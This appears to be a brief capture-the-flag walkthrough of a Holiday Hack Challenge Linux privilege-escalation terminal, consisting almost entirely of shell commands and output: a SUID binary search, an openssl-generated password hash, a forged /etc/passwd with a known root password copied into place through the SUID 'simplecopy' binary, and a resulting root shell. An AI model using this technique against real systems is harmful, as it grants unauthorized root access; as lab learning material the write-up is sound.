https://hhc23-wetty.holidayhackchallenge.com/?&challenge=linuxpriv&username=hackadviser&id=58daae4d-079d-426c-8ca3-7d06b46a3e67&area=imt-ostrichsaloon&location=7,7&tokens=&dna=ATATATTAATATATATATATTATAATATATATCGATCGGCATATATATATATATATATATATATATATATTAATATCGTAATATATATATATGCATATATATATATATTATAATATATTA

```
elf@f74043c4c164:~$ find / -perm /4000 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
elf@f74043c4c164:~$ 
```

```

```

```


castr@mymac ~ % openssl passwd tiatrini
$1$X4ylqlqO$JuS88jywvn5diPjbgAzOK1

elf@59967030bc50:~$ cat > hola
root:$1$X4ylqlqO$JuS88jywvn5diPjbgAzOK1:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
elf:x:1000:1000::/home/elf:/bin/sh
elf@59967030bc50:~$ 
elf@59967030bc50:~$ simplecopy hola /etc/passwd
elf@59967030bc50:~$ su
Password: 
root@59967030bc50:/home/elf# 
```



## Referencias
https://gtfobins.github.io/
